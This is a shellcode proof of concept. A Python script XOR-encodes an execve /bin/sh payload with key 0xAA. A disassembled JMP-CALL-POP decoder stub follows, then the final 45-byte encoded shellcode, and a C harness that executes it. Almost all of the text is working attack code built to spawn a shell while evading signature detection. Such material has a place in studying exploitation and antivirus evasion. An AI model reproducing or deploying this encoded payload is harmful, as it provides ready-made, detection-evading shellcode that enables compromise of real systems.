/*
; Date: 26/02/2019
; XOR-Encoder.py
; Author: Daniele Votta
; Description: This program encode shellcode with XOR technique.
; Tested on: i686 GNU/Linux
; Shellcode Length:25

#!/usr/bin/python
# Python XOR Encoder

# Execve /bin/sh
shellcode =("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode...'

for x in bytearray(shellcode):
	# XOR Encoding
	y = x^0xAA
	encoded += '\\x'
	encoded += '%02x' % y
	encoded2 += '0x'
	encoded2 += '%02x,' % y

print encoded +"\n"
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
*/

#include<stdio.h>
#include<string.h>

/*

; XOR-Decoder.asm
; Author: Daniele Votta
; Description: This program decode shellcode with XOR technique.
; Tested on: i686 GNU/Linux
; Shellcode Length:45
; JMP | CALL | POP | Techniques

XOR-Decoder:     file format elf32-i386

Disassembly of section .text:

08048080 <_start>:
 8048080:	eb 0d                	jmp    804808f <call_decoder>

08048082 <decoder>:
 8048082:	5e                   	pop    esi
 8048083:	31 c9                	xor    ecx,ecx
 8048085:	b1 19                	mov    cl,0x19

08048087 <decode>:
 8048087:	80 36 aa             	xor    BYTE PTR [esi],0xaa
 804808a:	46                   	inc    esi
 804808b:	e2 fa                	loop   8048087 <decode>
 804808d:	eb 05                	jmp    8048094 <Shellcode>

0804808f <call_decoder>:
 804808f:	e8 ee ff ff ff       	call   8048082 <decoder>

08048094 <Shellcode>:
 8048094:	9b                   	fwait
 8048095:	6a fa                	push   0xfffffffa
 8048097:	c2 85 85             	ret    0x8585
 804809a:	d9 c2                	fld    st(2)
 804809c:	c2 85 c8             	ret    0xc885
 804809f:	c3                   	ret
 80480a0:	c4 23                	les    esp,FWORD PTR [ebx]
 80480a2:	49                   	dec    ecx
 80480a3:	fa                   	cli
 80480a4:	23 48 f9             	and    ecx,DWORD PTR [eax-0x7]
 80480a7:	23 4b 1a             	and    ecx,DWORD PTR [ebx+0x1a]
 80480aa:	a1                   	.byte 0xa1
 80480ab:	67                   	addr16
 80480ac:	2a                   	.byte 0x2a
[+] Extract Shellcode ...
"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
======================= POC Daniele Votta =======================
*/

/* XOR Encoded (0xAA) Execve /bin/sh */
unsigned char code[] = \
"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}